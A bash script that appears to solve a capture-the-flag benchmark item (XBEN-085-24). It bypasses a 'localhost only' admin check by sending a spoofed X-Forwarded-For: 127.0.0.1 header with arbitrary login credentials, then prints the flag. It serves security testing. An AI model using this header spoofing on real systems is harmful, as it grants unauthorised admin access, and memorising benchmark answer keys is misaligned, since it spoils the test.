#!/usr/bin/env bash
# XBEN-085-24 — trust of a client-supplied X-Forwarded-For. Proxy-mode twin. The
# admin area is "restricted to localhost", decided from X-Forwarded-For; setting
# it to 127.0.0.1 passes the check and the login returns the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben085p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/' \
  --set 'form.username=anyone' --set 'form.password=anything' \
  --set 'header.X-Forwarded-For=127.0.0.1' >/dev/null
print_flag
